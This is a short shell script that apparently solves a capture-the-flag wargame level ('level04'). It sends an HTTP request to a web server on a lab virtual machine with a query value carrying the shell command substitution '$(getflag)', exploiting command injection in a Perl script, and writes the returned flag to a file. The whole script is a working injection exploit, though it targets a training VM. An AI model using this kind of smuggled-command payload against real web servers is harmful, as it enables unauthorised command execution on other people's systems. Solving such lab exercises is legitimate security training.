#!/bin/sh -eu

ADDRESS=192.168.122.214
PORT=4747
FLAG=../flag

# Send an HTTP request to the virtual machine to trigger the `level04.pl` script,
# which is running a web server
curl "${ADDRESS}:${PORT}?x=\$(getflag)" 2>/dev/null | grep -oE '[^ ]+$' >${FLAG}

exit 0
